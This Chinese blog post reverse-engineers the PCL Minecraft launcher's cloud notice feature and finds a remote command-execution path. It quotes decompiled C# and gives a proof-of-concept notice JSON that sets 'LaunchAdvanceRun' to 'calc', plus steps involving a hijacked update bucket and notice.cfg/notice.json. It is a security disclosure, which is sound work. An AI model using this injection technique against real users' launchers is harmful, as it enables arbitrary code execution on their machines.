---
title: 如何去发现 PCL 的云控 RCE 后门？
date: 2026-10-23 21:34:14
permalink: /post/pcl-notice-rce-discovery
description: 看到 PCL 的 RCE 后门 PoC，自己尝试研究了一番寻找点位
categories: 
  - 逆向
tags: 
  - 启动器
  - Minecraft
sidebar: auto
---

最近 Minecraft 启动器[集体关闭下载](/posts/minecraft-launcher-takedown-20261020)闹得沸沸扬扬，又出现了有人发现并[复现 PCL 远程执行后门](https://www.bilibili.com/video/BV1fYnB6dEAM)，但他只给出了较为模糊、快速的复现过程，本着探究真相的心理，我来逆向 PCL 看看。

反编译代码通过 `dnSpy 6.6.0` 获取，反编译对象为 `PCL 2.99.0.0 (413.50)`。

## 从现象入手

视频中提到，是通过公告下发的命令，启动游戏执行远程下发的命令。结合评论区有人提到 `"LaunchAdvanceRun"`，就搜索一下。PCL 配置里有这个 `"LaunchAdvanceRun"`，它是启动设置里面的“启动游戏前执行命令”配置。

![PCL](https://static.mcio.dev/images/PixPin_2026-10-23_21-08-29.webp)

搜索字符串 `"LaunchAdvanceRun"`，可以在 `ModLaunch` 和 `Settings` 这两个类里面找到。基本上是两点一线，设置里面读写配置，启动游戏之前检查不为空就执行 `cmd.exe /c "{LaunchAdvanceRun}"`。

反编译的时候，很容易就能发现，`ModSecret` 是存放秘密的地方（废话），CDN 签名、拉取公告等都在这里了。`Settings.Set` 方法调用也在这里扎堆，有储存更新 ID 的，有重置主题的。但是，里面还有一处诡异的调用，就在 `ServerSub` 方法中。

这个方法看起来是用来拉取公告的，在发现新的公告的时候执行一系列操作。通过对反编译代码的解读，公告的格式通常如下

```json
[
  {
    "id": 0,
    "requirements": {},
    "importantLevel": 2,
    "isUpdate": false,
    "title": "公告",
    "description": "",
    "buttons": []
    "actions": {}
  }
]
```

其它的我们不管，我们来看 `actions` 这一分支的解析：
```csharp
// 略有删减，但未更改代码逻辑，如有需要更详细地阅读，请自行反编译查看

// 遍历 actions 的每个元素，但不意味着这是 []，其实这是 {}
// 我没太看懂这个 JSON 库怎么用的，不过从下面的行为能看出这是 {}
foreach (object obj2 in ((IEnumerable)obj))
{
	JProperty jproperty2 = (JProperty)obj2;
	try
	{
    // 获取键名，并且在下面判断键名
		string name = jproperty2.Name;
    // 这里 != 0 是不匹配，也就是下面这堆条件基本一路开绿灯，可以当成不存在
    // 后面有 else 我省略掉了，这些条件还是有意义的

    // copy 是复制文字到剪贴板
		if (Operators.CompareString(name, "copy", false) != 0)
		{
      // website 是使用浏览器打开链接
			if (Operators.CompareString(name, "website", false) != 0)
			{
        // stop 是立即关闭程序
				if (Operators.CompareString(name, "stop", false) != 0)
				{
          // 注意看 setup 后面的 else，那里才是 else 的解析执行逻辑
					if (Operators.CompareString(name, "setup", false) != 0)
					{
						if (Operators.CompareString(name, "update", false) != 0 && Operators.CompareString(name, "slientupdate", false) != 0)
						{
							throw new Exception("未知的行动支：" + jproperty2.Name + ", " + jproperty2.Value.ToString());
						}
					}
					else // actions 里面的键，如果是 "setup"，进入到这个分支
					{
						JObject jobject2 = (JObject)jproperty2.Value;
						try
						{
              // 遍历 "setup" 里面所有的键值对，写进游戏设置里
							foreach (KeyValuePair<string, JToken> keyValuePair in jobject2)
							{
								Settings.Set(keyValuePair.Key, keyValuePair.Value.ToString(), null);
							}
							continue;
						}
						finally
						{
							// 省略
						}
					}
          // ... 后面一概省略
        }
      }
    }
  }
}

```

看到我的注释了吧？遍历 `"setup"` 里面所有的键，读取为字符串，写进游戏设置里。要是这个键是 “启动游戏前执行命令” `"LaunchAdvanceRun"` 会发生什么呢？

我们不妨构建一个最简公告条目

```json
[
  {
    "id": 999,
    "actions": {
      "setup": {
        "LaunchAdvanceRun": "calc"
      }
    }
  }
]
```

把它塞进更新公告里，这样应该就足以远程执行命令打开你的计算器了。

## 复现

我还有大把项目要写，开头提到的视频里已经有人复现了，我就不去复现了。

我上面推理出来的思路大抵是对的，只要跟视频里一样，接管 PCL 拉取更新的储存桶，推送一个更新过去试试就知道能不能复现了。也不用启动游戏，打开游戏设置看看更新公告里填的命令有没有进入“启动游戏前执行命令”就知道了。

需要往 `notice.cfg` 里添加更新公告的 ID，从源码来看，这个文件的内容是用 `|` 符号分隔的数字列表，PCL 会先拉取这个 cfg 再根据这些 ID 来决定是否拉取 json。

然后往 `notice.json` 里添加更新公告配置本体。

## 评价

龙猫也许不是故意的，但谁知道呢？虽然云控是很正常的事情，但是云控超出范围，客观上可以远程执行命令，那就不是用户能接受的了。  
也许是取消原版下载事件，下发的公告事发突然，让更多人了解到原来 PCL 是可以云控下发自定义弹窗的。有人反编译寻找云控逻辑的时候顺藤摸瓜，发现了可以利用公告下发游戏设置，来实现启动游戏时远程执行命令。

后门不会因为作者不是故意的、没有远程执行意向而变得无害，完全访问你的电脑的这把钥匙一直握在一个非备案软件的陌生人作者的手里。电脑小白可能因为无知而不在意，但至少对于开发者来说，这是完全不可接受的。

让我们来看看隔壁服务器插件圈子，付费插件作者[米饭](https://www.minebbs.com/threads/sql.35470/)，出于反盗版需要，而选择远程下发 SQL 这种高危操作，最终因为存在安全威胁而被论坛处罚。某种程度上，这二者是类似的，都是开发者推演并复现可以远程执行命令，只不过直接下发 SQL 比下发游戏启动设置间接执行命令更加震撼，更加直观。

补充：龙猫决定在下一个版本增加云控配置黑名单，将危险设置排除在外，详见[有关 PCL 存在所谓 “后门 / 漏洞” 的说明](https://afdian.com/p/4ab1e3f2cecf11f1836552540025c377)。这是好的。
